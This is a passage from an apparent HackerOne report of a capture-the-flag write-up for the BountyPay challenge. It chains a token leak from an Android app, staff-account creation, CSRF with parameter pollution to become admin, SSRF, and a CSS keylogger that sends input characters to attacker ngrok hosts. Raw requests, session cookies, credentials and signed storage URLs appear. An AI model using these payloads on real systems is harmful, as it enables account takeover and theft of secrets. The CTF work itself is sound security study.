button.setVisibility(0);\n            PartThreeActivity.this.thread.start();\n            } \n        } \n        } \n    }\n}\n```\n\nUsing the following URL: `three://part?switch=b24%3D\u0026three=UGFydFRocmVlQWN0aXZpdHk%3D\u0026header=X-Token` I was able to execute this code\n\n{F861013}\n\nI got the `HOST` header and the `X-Token` header in Android Studio's Logcat\n\n```\n2020-06-09 20:06:37.938 6261-6309/bounty.pay D/HOST¬†IS:: http://api.bountypay.h1ctf.com\n2020-06-09 20:06:37.939 6261-6309/bounty.pay D/TOKEN¬†IS:: 8e9998ee3137ca9ade8f372739f062c1\n2020-06-09 20:06:37.940 6261-6309/bounty.pay D/HEADER¬†VALUE¬†AND¬†HASH: X-Token: 8e9998ee3137ca9ade8f372739f062c1\n```\n\n{F861010}\n\nIt's important to note that I didn't really have to open the APK in an emulator, as I could have edited the `user_created.xml` via `adb`. However, I wanted to actually see what I was facing with as it made it much more clear for me. \n\nThe last Activity had helped me to figure that there's more than just a token and a host. There were two more things that will be useful in the next two steps: \n\n1. There's a POST request to the exposed host, but something is missing. \n2. The twitter handle made me think that I might have missed something while doing my recon, so I got back to it and found that there was a new employe called Sandra.\n\n### Step 8 - Information Disclosure (Twitter Account)\n\nBountyPay's [Twitter account](https://twitter.com/BountypayHQ) [tweeted a welcome message](https://twitter.com/BountypayHQ/status/1258692286256500741) about a new employe. Looking for this employee, I found an interesting string which seemed like an ID: \nhttps://twitter.com/SandraA76708114/status/1258693001964068864/photo/1\n\n{F861014}\n\n### Step 9 - Authentication Bypass (Creating Sandra's user)\n\nAfter I saw the POST request in the APK together with the host and the X-Token header, I went back to my notes, as I remembered that there were few endpoints that I wasn't able to test due to a missing token. \n\nI first tried to hit `https://api.bountypay.h1ctf.com/api/staff` using the X-Token. This gave me an interesting result: \n\n```bash\nGET /api/staff? HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\n\n```\n\nResponse\n```bash\n[{\"name\":\"Sam Jenkins\",\"staff_id\":\"STF:84DJKEIP38\"},{\"name\":\"Brian Oliver\",\"staff_id\":\"STF:KE624RQ2T9\"}]\n````\n\nAfter I saw this, I tried to do the same with the following POST request: \n\n```bash\nPOST /api/staff?firstParam=UGFydFRocmVlQWN0aXZpdHk%3D HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 23\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:84DJKEIP38\n```\n\nBut that resutled with the following reponse: \n\n```bash\nHTTP/1.1 409 Conflict\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 13:15:29 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 39\n\n[\"Staff Member already has an account\"]\n```\n\nClearly, as Sandra was part of the staff, I went back to Sandra's id and tried her `staff_id`: \n\n```bash\nPOST /api/staff HTTP/1.1\nHost: api.bountypay.h1ctf.com\nX-Token: 8e9998ee3137ca9ade8f372739f062c1\nContent-Length: 36\nContent-Type: application/x-www-form-urlencoded\n\nstaff_id=STF:8FJ3KFISL3\n```\n\nAnd got the following response: \n\n```bash\nHTTP/1.1 201 Created\nServer: nginx/1.14.0 (Ubuntu)\nDate: Wed, 03 Jun 2020 19:42:33 GMT\nContent-Type: application/json\nConnection: keep-alive\nContent-Length: 110\n\n{\"description\":\"Staff Member Account Created\",\"username\":\"sandra.allison\",\"password\":\"s%3D8qB8zEpMnc*xsz7Yp5\"}\n```\n\n### Step 10 - CSRF, Parameter Pollution, Privilege Escalation via CSRF\n\nOnce I got staff credentials, I opened https://staff.bountypay.h1ctf.com and logged in with Sandra's account. \n\nThe staff dashboard introduced a [javascript file](https://staff.bountypay.h1ctf.com/js/website.js) that looked like the right place to start from:\n\n```javascript\n$(\".upgradeToAdmin\").click(function() {\n    let t = $('input[name=\"username\"]').val();\n    $.get(\"/admin/upgrade?username=\" + t, function() {\n        alert(\"User Upgraded to Admin\")\n    })\n}), $(\".tab\").click(function() {\n    return $(\".tab\").removeClass(\"active\"), $(this).addClass(\"active\"), $(\"div.content\").addClass(\"hidden\"), $(\"div.content-\" + $(this).attr(\"data-target\")).removeClass(\"hidden\"), !1\n}), $(\".sendReport\").click(function() {\n    $.get(\"/admin/report?url=\" + url, function() {\n        alert(\"Report sent to admin team\")\n    }), $(\"#myModal\").modal(\"hide\")\n}), document.location.hash.length \u003e 0 \u0026\u0026 (\"#tab1\" === document.location.hash \u0026\u0026 $(\".tab1\").trigger(\"click\"), \"#tab2\" === document.location.hash \u0026\u0026 $(\".tab2\").trigger(\"click\"), \"#tab3\" === document.location.hash \u0026\u0026 $(\".tab3\").trigger(\"click\"), \"#tab4\" === document.location.hash \u0026\u0026 $(\".tab4\").trigger(\"click\"));\n```\n\nI figured that I'd have to make all of the following to happen all at once: \n\n1. Send a report to an admin.\n2. Make the admin to trigger a click on upgradeToAdmin button.\n3. Make sure Sandra's username would be injected to an input form. \n\nWithin the report, I figured that I had to send a URL containg a `#tab2` in the url (or any other tabs for that matter) as this will trigger a click.\n\nThen, in order to make an automated click, I replaced my avatar with `upgradeToAdmin tab tab2` by editing my profile: \n\n```bash\nPOST /?template=home HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nConnection: close\nContent-Length: 67\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nReferer: https://staff.bountypay.h1ctf.com/?template=home\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbFRkbnIvU3MzMndYSW5XNmNFS1l5T1FDdTVNZFJPMS9TTWtDWEFkODBtRGRlbXpERlZ5WVlUdVZ6eDA0VnkxaWxRbU9CUVA2dFVoOTdwQVljb0NpbSt2d0RkYVF1N1BHUmFSbjZkNHpH\n\nprofile_name=sandra1\u0026profile_avatar=avatar1 tab upgradeToAdmin tab2\n```\n\nEnding up with a new cookie in the response:\n\n```bash\nHTTP/1.1 302 Found\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 22:18:02 GMT\nContent-Type: text/html; charset=UTF-8\nConnection: close\nSet-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzRURHQnNvUU55ckRtOTZyWllJcWgzL3J6Uk9BK21iWnVEYkt1U0JrZFNoODMzMVB4MmFiYWg5YXBwSG1NeWNNUmYrUUJiU084U2JwST0%3D; expires=Tue, 07-Jul-2020 22:18:02 GMT; Max-Age=2592000; path=/\nLocation: /?template=home\nContent-Length: 0\n\n```\n\nNow I had to figure how to inject the username. This took some time, but at the end I thought about the way Hackerone uses its parameters and tried the same by passing a template array instead of template string, i.e: \n\nhttps://staff.bountypay.h1ctf.com/?template[]=login\u0026template[]=ticket\u0026username=sandra.allison\u0026ticket_id=3582#tab2\n\nUsing this URL I had 2 templates loaded: \n\n{F861126}\n\nNow all I had to do was sending the encoded URL to the admin: \n\n```bash\nGET /admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRpY2tldF9pZD0zNTgyI3RhYjI= HTTP/1.1\nHost: staff.bountypay.h1ctf.com\nConnection: close\nAccept: */*\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36\nX-Requested-With: XMLHttpRequest\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: https://staff.bountypay.h1ctf.com/?template=ticket\u0026ticket_id=3582\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,he;q=0.8\nCookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzRURHQnNvUU55ckRtOTZyWllJcWgzL3J6Uk9BK21iWnVEYkt1U0JrZFNoODMzMVB4MmFiYWg5YXBwSG1NeWNNUmYrUUJiU084U2JwST0%3D\n\n```\n\nand a new cookie was generated \n\n```bash\nHTTP/1.1 200 OK\nServer: nginx/1.14.0 (Ubuntu)\nDate: Sun, 07 Jun 2020 22:18:47 GMT\nContent-Type: application/json\nConnection: close\nSet-Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCWnZ5cnprMkdlQlJSS0dJdjdqWnlyTmRZNUYrVDA2VG9aNGduY3NFU2NFbzB0QXdLOXZmMVVPRS84SFhqL2Q0bDA0M2xZdXgvNVhnc0hkZWtkdmlZWjhIcjNVMmVNYmYzNktXd3VtR2tVcURtOTZyWllJcWgzL3J6Uk9BK21iWjdaYkt1UkJrTloxc21qaGFkd05lR2s5cTF2U1dFMWRwbFYrMWRlU09BUmJwST0%3D; expires=Tue, 07-Jul-2020 22:18:47 GMT; Max-Age=2592000; path=/\nContent-Length: 19\n\n[\"Report received\"]\n\n```\n\n\n### Step 13 - Information Disclosure (CEO username \u0026 password)\n\nAs an Admind I was able to see the application's users: \n\n{F861125}\n\nso I took the Marten Mickos' credentials, opened https://app.bountypay.h1ctf.com and logged in by passing the 2FA from step 3. \n\n### Step 14 - SSRF\n\nAs mentioned at the beginning, I knew that I was suppose to find a way to make May 2020's payments, so I directly loaded this date and got the payment button: \n\n{F861124}\n\nI clicked next and saw an interesting hidden input which was using a .css URL: \n\n{F861123}\n\nI replaced this URL with my own URL using ngrok, and started to play with that. I assumed the following: \n\n- It had something to do with the 2FA application.\n- It had a hint within the original css file. \n\n\u003e Template for the UNI 2FA App\n\n- The css was loaded somewhere else by the server.\n\n\n### Step 15 - CSS Keylogger via SSRF\n\nAfter playing around I [read about a way to create a CSS KeyLogger](https://css-tricks.com/css-keylogger/) and implemented it by myself and it worked. However, I had a problem figuring out the order of the request, which made me create a very specific css, for example: \n\n```\ninput:first-child[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+\"); }\ninput:nth-child(2)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-2\"); }\ninput:nth-child(2)[value$=\" \"] { background-image: url(\"https://dd36dc8b7bc5.ngrok.io/+-3\"); }\ninput:nth-child(4)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-4\"); }\ninput:nth-child(5)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-5\"); }\ninput:nth-child(6)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-6\"); }\ninput:nth-child(7)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-7\"); }\ninput:nth-child(8)[value$=\" \"] { background-image: url(\"https://8c7a64aff54e.ngrok.io/+-8\"); }\n```\n\nThis ended up with the following requests: \n\n{F861122}\n\nand that way I was able to find the flag:\n\n{F861142}\n\n## Impact\n\nFlag is: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG$`.\n\nThanks again for this great and long challenge! \n","automated_response":false,"created_at":"2020-06-09T19:31:11.243Z","updated_at":"2020-06-09T19:31:11.243Z","actor":{"username":"shakedko","cleared":false,"url":"/shakedko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ak1oSZijBCAPDuMVcNi2Mosb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":861142,"filename":"bountypay-completed.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/7q1BPTY3DQ3V2Aw4WnpyoxUS?response-content-disposition=attachment%3B%20filename%3D%22bountypay-completed.png%22%3B%20filename%2A%3DUTF-8%27%27bountypay-completed.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7af79c08988cfbfa02969234b572def350ac7361850098e892f6f9751be8a2b9"},{"id":861127,"filename":"bountypay-done.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/GjKCSTFko2befDWvBiNmtHtb?response-content-disposition=attachment%3B%20filename%3D%22bountypay-done.png%22%3B%20filename%2A%3DUTF-8%27%27bountypay-done.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=a74adecd4b1c48e5beb68f5e70fa9420462e90d23c66524902da03b5d42e2555"},{"id":861126,"filename":"twotemplates.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/tTTnPzRZZZq3rzeZejP6Vctv?response-content-disposition=attachment%3B%20filename%3D%22twotemplates.png%22%3B%20filename%2A%3DUTF-8%27%27twotemplates.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2f427a380eaa5e8d6f5d546ab08b7ab36b4993bdb972a2a52cf19e23d15a2f69"},{"id":861125,"filename":"application-users.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/aSUcBZ8JdnAaFmt6SuMpsPFZ?response-content-disposition=attachment%3B%20filename%3D%22application-users.png%22%3B%20filename%2A%3DUTF-8%27%27application-users.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=fea9720fa63e15ca141658156e00569622b44082d0c1893c22e89c0dd3cda6cc"},{"id":861124,"filename":"payment-2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/VdyhNNB8fZ8DE9KEnRH3MXsy?response-content-disposition=attachment%3B%20filename%3D%22payment-2.png%22%3B%20filename%2A%3DUTF-8%27%27payment-2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=67dca4aff9b1a03f15594cbba3008b7e3b3e24bf8143a8ced7ef20ecbd99936f"},{"id":861123,"filename":"payment-1.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iqpwzLA5a4kEQPGQNh44jU93?response-content-disposition=attachment%3B%20filename%3D%22payment-1.png%22%3B%20filename%2A%3DUTF-8%27%27payment-1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQQUWX32YR%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153921Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJIMEYCIQDI60ST6nG4q4laTSFldIqSXi%2FaRkkQyutm5GwT0cJIZgIhAOZhMg3jBlju6Int%2BeeUm1aiBO7rhlrQcLIk%2Bgf6D%2BEDKoMECO%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgwXNLBv9MILvVoorSoq1wOfX3WD6Q7XyleYeGc645Essao0xgUb9KvTqDMYcvHVGFjpYncM47xpmv3HMsu%2F5W1XrLh7mNNldxl0sp09zO40TE5Gv3tk2fKUJkR%2FD6XSYmqjjSQ1X8rpbrso174vGjaIUSzY97sO%2Fd37gH6ZpB7ew%2Fv3oEvinQIGLVJR0eRzLhiviACbbOMKLVbWbamWcEPt5JM%2BAi%2F9NdNl7YuEpr2x1Aba%2FQ7SrG7ebdm1DcE0lVqIqx0ztrFvl3nirCMo74N6ge1UFzEhWH44%2BFZEehSLzVwe3%2F%2FBZFO65bGyxbdcPGK84GPYyTmQ%2BjLOaldd7KqAdRhPjDfqVNtwC3oWvVdxRnK%2FoQIrzUgaia36mrU%2B9zb4%2FRhBIhVDxcpxUM1gkKjO26kCJizTpuEecHCYqUizMVCu%2BZHsHDBDtIkkSFfQ%2B2gv2sFyQKltKMSVLAEHz02kDaXPYdZgNpJpJb5mig7chRqoJheUFMk5FqS9E%2FlqeZ5JfW22b6sOCLD%2FEMKSDTLFHVl3btbPUCjyHfhmlMXnpBRHVIqKR1wYVgjD5A7%2FSBEWiHu7RrZzNRZghQJBq1L32qmueS8YHqpboqJLILIuPtnLxC99DFuXuovAM4duMqxEoPDhN0Mw3oyRiwY6pAEUCR%2BsNQPvZhxAQDP4H0mmjcS7kJOELluaCLhnFR0avdVxZaYB9x8Q%2B1vVVuMQVfHNSrjWJl4H%2Be5xJlQ6IIY3JmCIpBdpvoYal7a%2B64IuQyPvQqpHA3Ie7oP5I5O%2F9TxjNDzuk8S48F6Uu5xP3VWBG1thWt0Ez9VpERdwmSl9%2FKYIOOCQmgzrHUQhmsthA0Nah76KucMZDyOmhK8c6RFPBq%2BuQw%3D%3D\u0026X-Amz-SignedHeaders=host\u002